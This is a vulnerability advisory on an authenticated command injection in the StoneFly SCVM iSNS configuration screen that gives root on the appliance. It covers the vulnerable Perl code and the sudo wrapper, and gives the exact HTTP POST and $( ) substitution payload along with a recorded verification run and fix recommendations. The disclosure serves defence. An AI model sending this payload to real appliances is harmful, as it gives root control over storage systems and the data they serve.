# StoneFly SCVM 8.0.4.29 - iSNS Server Configuration ipaddress Command Injection

Advisory: https://0day-rubbish.com/blog/ff-isns-ipaddress-command-injection-root-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

StoneFly SCVM (Storage Concentrator Virtual Machine) is the vendor's virtual storage appliance, shipped
as an OVA image for import into VMware ESXi, VirtualBox or KVM and administered through an HTTPS
management GUI on ports 80 and 443. That GUI is an Apache plus mod_perl deployment in which each screen
is a CGI program under `/StoneFly/bin/`, and the iSNS server configuration screen is
`/StoneFly/bin/ff_isns.pl`. The screen has a form field named `ipaddress` whose value is meant to be the
address of an iSNS server. Instead of validating that value as an address, the script passes it, with no
escaping at all, into an argument string for `StoneFly::firefly::sf_ping()`. That helper builds a ping
command line, writes it into a wrapper shell script under `/tmp`, and executes the wrapper through
`sudo /usr/local/StoneFly/bin/command.pl`, which the appliance's `/etc/sudoers` authorizes for the Apache
account with no password. The wrapper therefore runs in a root shell, and an `ipaddress` value containing
`$( )` is command substituted by root before `ping` is ever started.

The result is a single-request escalation from a legitimate administrator session to arbitrary command
execution as root on the storage appliance. A payload of the shape
`127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8` was submitted once through the form
and the substituted command wrote a marker owned by `root:root` containing
`uid=0(root) gid=0(root) groups=0(root)`.

### Overview of the verification boundary

The verification recorded for this finding is an end-to-end run against the vendor's own appliance image:
the shipped `SCVM.ova` was converted to a raw disk image and booted in QEMU system mode with the kernel
loaded directly, with a user-mode network forwarding a host port to the guest's HTTPS port, and with the
forwarder bound to the loopback interface only so that no traffic left the isolated research host. The
authentication steps, the CSRF token retrieval, the form submission and the marker file were all executed
against that running appliance, and the marker was read back from the guest filesystem after a clean
shutdown. Root was observed inside that replication environment; no physical SCVM hardware was driven
during this research, and no claim in this advisory depends on hardware behaviour that the image does not
itself exhibit.

The isolation measures - a loopback-bound forwarder and a user-mode network - are properties of the test
bed, not of the product. In a normal deployment the same management GUI is reached over the network on
port 443, which is what the published attack vector assumes.

### Overview of what this advisory does not claim

No memory-corruption primitive is involved. No pre-authentication path is claimed: the injection is
reached only with a valid administrator session and that session's page token. No claim is made about
other StoneFly product lines, about firmware builds other than the analyzed 8.0.4.29 image, or about any
behaviour of the appliance after the injected command completes beyond what the marker demonstrates. No
CVE identifier has been assigned to this finding, and none is attributed to it here.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value |
| --- | --- |
| Product | StoneFly SCVM (Storage Concentrator Virtual Machine) |
| Affected version | 8.0.4.29 |
| Platform | virtual appliance, CentOS 6 based stack, kernel 2.6.32-696.el6.SF1.x86_64 |
| Component | `/StoneFly/bin/ff_isns.pl`, iSNS server configuration screen |
| Source | the `ipaddress` CGI parameter of the configuration form |
| Sink | `StoneFly::firefly::sf_ping()` in `firefly.pm`, which writes and runs a root wrapper script |
| Execution identity | root, through `sudo /usr/local/StoneFly/bin/command.pl` |
| Authentication | valid administrator session plus the page CSRF token |
| Injection class | OS command injection, `$(` command substitution |
| CWE | CWE-78 |
| CVSS 3.1 | 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Tested against | the vendor OVA image, booted end to end under QEMU system mode |

### Vulnerability Summary mechanics

The defect is a missing neutralization at a single point. The form handler reads the parameter and hands
it straight to the ping helper:

```perl
if($cgi->param("submit_form")){
    my $ipaddress = $cgi->param("ipaddress");
    my $p_r = StoneFly::firefly::sf_ping(
        "-w 2 -c 2 $ipaddress > /dev/null 2>/dev/null"
    )->{error_status};
```

The recorded position of this block is lines 111 to 113 of `ff_isns.pl`. There is no address parser, no
character filter and no quoting between the parameter and the string. Everything the client sends becomes
part of a command line that a root shell later parses.

### Vulnerability Summary preconditions

Three conditions must hold, and all three are ordinary properties of an authenticated management
session: the client holds a valid administrator session cookie; the client presents the CSRF token of the
iSNS page in the same POST; and the iSNS configuration form is reachable, which it is on an unmodified
appliance. No race, no timing window and no second request are required. The record establishes exactly
one POST from an authenticated session as sufficient.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

The screen sits behind the management GUI's session handling. The login endpoint
`/StoneFly/bin/login.pl` accepts `user_login` and `user_password` and answers a successful authentication
with HTTP 302 and a session cookie whose name carries the listening port as a suffix, in the recorded
form `session_id_<port>`. Every subsequent request must carry that cookie, and the configuration POST must
additionally carry the `csrf_token` value rendered into the page, which the recorded run extracted from
the 77221-byte iSNS page before submitting.

The parameter set of this form is also registered in the shared session check as administrator
parameters. The record shows the call

```perl
Shared::check_security($cgi, $session, ["ipaddress","use_isns",
    "submit_form", ...]);
```

with the recorded note that those names are the ones an administrator session may carry. That is the
recorded basis for describing the endpoint as administrator-gated rather than merely session-gated.

### Authentication Boundary - what the chain does not do

The chain does not defeat the login, does not forge a session, does not reuse a default credential and
does not require any second account. It consumes a legitimate administrator session and that session's
own page token, exactly as a browser would. It also does not depend on the administrator's password being
weak: the request is well formed and would succeed with any password that authenticates.

### Authentication Boundary - why that boundary does not soften the impact

The boundary is real and it is the reason the published vector carries high privileges rather than none.
What it does not do is bound the outcome. An administrator is expected to be able to configure the
appliance, to create volumes, to export them over iSCSI and to manage its network settings; an
administrator is not expected to obtain an interactive root shell on the appliance's operating system.
The privilege boundary the vendor draws is between "may configure storage" and "may run code as root",
and this defect erases the second one. Administrative accounts are also the accounts most likely to be
shared, scripted, retained after a staff change and targeted by credential phishing, so a defect that
converts one into root code execution widens the consequence of every compromise of that account.

## 4. Attack Surface

### Attack Surface - the management web plane

The management GUI is an Apache plus mod_perl deployment serving Perl CGI programs from
`/StoneFly/bin/`. Each configuration screen is one `.pl` program that reads its own form fields, performs
its own validation and calls into the shared `StoneFly::firefly` library for privileged operations. That
architecture concentrates the interesting defects at the boundary between a screen's parameter handling
and the helpers it calls.

### Attack Surface - why the audit narrowed on the ping helper

The appliance-wide sweep recorded for this research found 44 CGI scripts that reach a shell through the
same `sf_ping` pattern, that is, that construct a ping command line from request data and hand it to the
root wrapper. Two siblings are named in the record as carrying the identical root cause family:
`dns_server.pl`, which feeds the primary and secondary DNS server address fields into `sf_ping`, and
`ff_network_route.pl`, which feeds a ping target address into it. The iSNS screen is the instance that was
taken through dynamic verification; the others are recorded as the same pattern, not as separately
verified exploits.

### Attack Surface - components that narrowed out

The audit did not treat every CGI on the appliance as equivalent. Screens that pass request data only to
fixed program logic, that never build a command string, or that validate the value against a strict
address parser before use were outside the finding. The distinguishing property is narrow and mechanical:
request data reaching a string that a shell will parse.

## 5. Sink Identification

### Sink Identification - the ping helper

`StoneFly::firefly::sf_ping()` is the sink. The recorded implementation, at line 7917 of `firefly.pm`,
builds the child command by prefixing the fixed ping path to its argument string, and then arranges for
that command to be executed by a privileged wrapper:

```perl
my $cmd = "/bin/ping ".$args;
...
$sudo = "sudo /usr/local/StoneFly/bin/command.pl COMMAND ";
do_command($sudo."' /bin/echo -e \"".$pingcommand_sh.
    "\" > /tmp/pingcommand.$ppid.sh; chmod 777 ...'");
```

Two properties of this construction matter. First, the assembled command, including the caller's
argument string, is written into a script file under `/tmp` whose name is derived from the process id.
Second, the file is made world-executable and then executed through the privileged helper. The argument
string therefore survives as shell source text, not as an argument vector: whatever quoting the caller
did or did not do is preserved into the root shell's parse.

### Sink Identification - the privilege hop

The hop to root is explicit and configured on the appliance. `/etc/sudoers` carries the recorded line

```
apache ALL=NOPASSWD:/usr/local/StoneFly/bin/command.pl
```

so the Apache account may run the command helper as root without a password. The helper itself writes its
argument into a file and executes it, as recorded in the calling convention used by the library:

```
command.pl: echo "$@" > commandsh_$$.out; execute that file
```

The net effect is that a string assembled by a Perl CGI from request data becomes a root shell script.
There is no argument-array boundary anywhere in the path, no shell-escaping step, and no privilege drop
between the web request and the root execution.

### Sink Identification - execution identity

The identity is root, and this is not an inference from configuration alone: the artifact left by the
verified run is a file owned by `root:root` containing the output of `id` from the shell that the wrapper
started. On the analyzed image the record shows

```
-rw-r--r-- 1 root root 39 /usr/local/StoneFly/log/SF_isns_ROOT
uid=0(root) gid=0(root) groups=0(root)
```

The 39 bytes match the 38 visible characters of that line plus a terminating newline, which is what a
shell redirection of `id` produces.

## 6. Source Identification

### Source Identification - the parameter

The source is the `ipaddress` field of the iSNS configuration form, read inside the
`if($cgi->param("submit_form"))` branch and used immediately. The recorded block was quoted in section 2.
The companion fields `use_isns` and `submit_form` only select the branch; `ipaddress` is the only field
that reaches the command string.

### Source Identification - what validation exists

None on this path. The record shows the parameter being assigned directly from the CGI object and then
interpolated into the argument string with no intermediate function call. The shared session check
described in section 3 is an authorization test, not an input test: it decides whether the session may
carry these parameter names, and it does not inspect their values. The consequence is that the entire
character set a shell finds interesting - `$`, `(`, `)`, backtick, semicolon, pipes, redirections - is
available to the client.

### Source Identification - what the payload must respect

The value is inserted in the middle of a ping command line that ends with output redirections, and the
helper wraps the whole line in a script that begins with a shell assignment. A working value therefore
has to keep the surrounding command syntactically valid so that the wrapper reaches the point where the
substitution is expanded. The recorded payload does this by leaving a valid address prefix and suffix
around the substitution: `127.0.0.1` before it and `8.8.8.8` after it. Even if `ping` is never reached,
the shell parses and expands the whole line first, which is all the payload needs.

## 7. Data Flow

### Data Flow - end to end

```
[1] authenticated browser session
      POST /StoneFly/bin/ff_isns.pl
      csrf_token=<page token>&submit_form=true&use_isns=false
      ipaddress=127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8

[2] ff_isns.pl, lines 111-113
      $ipaddress = $cgi->param("ipaddress")           no validation
      sf_ping("-w 2 -c 2 $ipaddress > /dev/null 2>/dev/null")

[3] Shared::check_security(...)
      ipaddress, use_isns, submit_form                administrator parameters

[4] firefly.pm sf_ping(), line 7917
      $cmd = "/bin/ping " . $args
      write $cmd into /tmp/pingcommand.<ppid>.sh
      chmod 777 on the wrapper script

[5] sudo /usr/local/StoneFly/bin/command.pl
      /etc/sudoers: apache ALL=NOPASSWD:/usr/local/StoneFly/bin/command.pl
      command.pl writes its argument to a file and executes it as root

[6] root shell parses /tmp/pingcommand.<ppid>.sh
      IFES=..; /bin/ping -w 2 -c 2 127.0.0.1
      $(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8 > /dev/null 2>/dev/null
      the substitution expands first, as root
```

### Data Flow - properties worth naming

The flow crosses four trust decisions without a single neutralization: the form handler's parameter read,
the session check's authorization decision, the library helper's string construction, and the privileged
helper's execution. Only the second of those four is a control, and it answers a different question. The
data is never converted to a non-string type, never compared against a pattern and never passed through an
argument vector. That is why the defect is a plain missing neutralization rather than an arithmetic or
parser-confusion bug.

## 8. Exploit Construction

### Exploit Construction - request shape

One authenticated POST carries the whole exploit:

```http
POST /StoneFly/bin/ff_isns.pl HTTP/1.1
Host: 192.0.2.10
Cookie: session_id_443=<session value>
Content-Type: application/x-www-form-urlencoded

csrf_token=<page token>&submit_form=true&use_isns=false&ipaddress=127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8
```

The session value comes from the login response, and the page token comes from a preceding GET of the
same screen. Both are ordinary values a browser would hold.

### Exploit Construction - payload engineering

```
ipaddress  : 127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8
arguments  : -w 2 -c 2 127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8 > /dev/null 2>/dev/null
written to : /tmp/pingcommand.<ppid>.sh
runs as    : root, through sudo command.pl
```

The substitution is placed where a host address would sit, so the line stays parseable whether or not
`ping` runs. `$( )` is used rather than the backtick form because it nests cleanly inside the double-quoted
`echo -e "..."` that the helper uses when it writes the wrapper script. The redirection inside the
substitution sends both the output and any error of `id` to the marker path, so a failure would still
leave a trace rather than silently succeed.

### Exploit Construction - what the provided PoC does

`exploit/stonefly_scvm_isns_poc.py` performs exactly three requests: the login POST, the GET that yields
the page token, and the form POST. It takes the target, port, account and marker path from arguments,
prompts for the password rather than embedding one, defaults the target to the documentation address
`192.0.2.10`, and writes nothing except the marker produced by the injected command. It does not modify
iSNS settings beyond the one form submission, does not delete or rewrite anything, and does not attempt
persistence.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

The appliance image was the vendor's `SCVM.ova`, converted to a raw disk and booted with QEMU in system
mode, kernel loaded directly, on an isolated host. The guest's management HTTPS port was forwarded to a
host port with a user-mode network, and the forwarder was bound to `127.0.0.1` only, so the test bed was
not reachable from any other host. The administrator account used for the run was created inside that
research environment.

This is an end-to-end run of the shipped image: the requests were sent to the real CGI programs of the
real appliance, the appliance performed its own authentication and its own CSRF check, and the marker was
read from the guest filesystem. It is not a simulation of the sink.

### Dynamic Verification - the recorded run

```
R1  POST /StoneFly/bin/login.pl  user_login=admin&user_password=<account password>
    -> HTTP 302 plus session cookie                      authentication accepted
R2  GET  /StoneFly/bin/ff_isns.pl
    -> page 77221 bytes, csrf_token=<page token>         token extracted
R3  POST /StoneFly/bin/ff_isns.pl
    csrf_token=<page token>&submit_form=true&use_isns=false
    &ipaddress=127.0.0.1$(id >/usr/local/StoneFly/log/SF_isns_ROOT 2>&1)8.8.8.8
    -> HTTP 200, 17.1s                                   submission accepted
R4  clean shutdown, forensic read of the guest filesystem
    -> /usr/local/StoneFly/log/SF_isns_ROOT
       39 bytes, owner root:root
       uid=0(root) gid=0(root) groups=0(root)
```

The marker was read back after a clean shutdown rather than from a live shell, so the evidence is a
filesystem artifact with its ownership intact, not a console transcript. The recorded response time of
17.1 seconds is consistent with the synchronous path: the request handler waits while the wrapper script
runs the two-ping command before the page is rendered.

### Dynamic Verification - controls and negatives, stated exactly as recorded

The record notes two A/B control runs around the injection timing and states that the visible responses
were consistent, including across a crash-and-restart forensic pass in which the same versions were
re-checked. The record does not contain a separate benign-value control artifact whose absence of a
marker was captured and filed, and this advisory therefore does not claim one. What is claimed is
narrower and fully supported: a single form submission with the payload above produced a root-owned
marker file, and the retrieval of that file required no privileged access beyond reading the guest disk.

### Dynamic Verification - what was not tested

No test was run against physical SCVM hardware. No other firmware build was executed. The two recorded
sibling scripts with the same pattern were identified statically and were not separately exploited. The
behaviour of the appliance after the marker was written, including any effect of the ping command itself
on the submitted address, was not the subject of the verification.

## 10. Reachability and Security Impact

### Reachability - network position

The management GUI is the appliance's administrative network service, served over HTTPS on port 443 (and
HTTP on port 80), on a virtual machine that is deployed onto a hypervisor and reached across the network
by administrators. That is the basis for the network attack vector in the published CVSS vector. The
loopback binding in the test bed was a research isolation measure and is not a property of the product;
equally, this advisory makes no claim that an unmodified deployment exposes the interface to the public
internet, and operators who place the management plane behind a dedicated administration network reduce
exposure without removing the defect.

### Reachability - what one request buys

A single accepted POST reaches arbitrary command execution as root inside the appliance. From that
position an attacker holds the storage appliance's own authority: the complete configuration of the
storage services it exports, the configuration and credential material the appliance stores for its own
operation, the data on the volumes it serves, and the ability to stop serving them. On a storage
appliance the last point is the one that turns a confidentiality problem into an availability problem for
everything downstream of it: an iSCSI target that stops answering affects every initiator that depends on
it.

### Reachability - why the impact is not bounded by the authentication requirement

The requirement of an administrator session limits who can start the chain; it does not limit what the
chain achieves, and it does not limit who benefits from it afterwards. An attacker who obtains an
administrator credential by phishing, reuse or a shared account gets root, not merely a configuration
panel, which means the credential compromise is no longer recoverable by changing the password: a root
shell can plant persistence and re-enter independently. That is the practical difference between this
finding and a configuration-integrity bug behind the same login.

## 11. Fix Recommendations

1. Validate `ipaddress` as an address before it is used: accept only a well-formed IPv4 or IPv6 literal,
   reject everything else before the `sf_ping` call, and reject at the form handler rather than relying on
   a downstream check. An allowlist parser is the correct control here; a character blocklist is not.
2. Stop interpolating request data into a shell command line. `sf_ping` should take an address argument
   and build an argument vector, executing `ping` with `execv` semantics so that no shell parses the
   value. This removes the class on this surface instead of narrowing it.
3. Remove the root wrapper indirection from the ping path. A reachability test does not need root; if
   `ping` genuinely requires a raw socket, grant that capability narrowly rather than routing arbitrary
   text through `sudo command.pl`.
4. Change `command.pl` so that it never writes its argument to a file and executes it. If its interface
   must remain "run this string", it should at minimum accept a fixed operation identifier plus
   validated parameters, and refuse to execute content that it cannot attribute to a known operation.
5. Restrict the sudoers entry. `apache ALL=NOPASSWD:/usr/local/StoneFly/bin/command.pl` grants the web
   account a general root execution primitive; scope it to the operations the GUI actually performs, and
   remove it entirely from paths that only need to send an ICMP echo.
6. Audit the other screens that share the pattern. The record identifies 44 CGI scripts that reach a
   shell through the same helper, with `dns_server.pl` and `ff_network_route.pl` named as carrying the
   same root cause; all of them need the same review, and fixing only `ff_isns.pl` leaves the family in
   place.
7. Add a regression test at the handler level: submit an `ipaddress` containing `$(true)` and assert that
   the request is rejected or that no shell-out occurs; repeat with the backtick and semicolon forms so
   that a future validator change cannot silently reopen the path.
8. Until a fix ships, operators should keep the management interface on a dedicated administrative
   network, avoid sharing administrator accounts, and treat any administrator credential as equivalent to
   root on the appliance.

## 12. CWE

### CWE - classification rationale

CWE-78, Improper Neutralization of Special Elements used in an OS Command, is the correct primary
classification. The `ipaddress` value is not merely reflected or stored: it becomes part of a command
string that a shell executes, and the shell interprets the metacharacters the application failed to
neutralize. All four elements of the weakness are present and recorded: the data comes from an upstream
component (the CGI parameter), it is used to construct a command, no neutralization happens on the path,
and the resulting command executes with the application's authority - here root, through the configured
sudo hop.

The adjacent classifications do not fit as well. CWE-77, command injection that is not specifically shell
command injection, would apply if the value reached an exec-style interface; here it reaches a shell
script, so the shell-specific entry is the accurate one. CWE-88, argument injection, would describe a case
where the value is passed as an argument to a program without a shell in between; that is the opposite of
what happens in this path. The single classification is therefore CWE-78, and no identifier beyond it is
claimed.

---

Written by the 0day Rubbish Research Team.
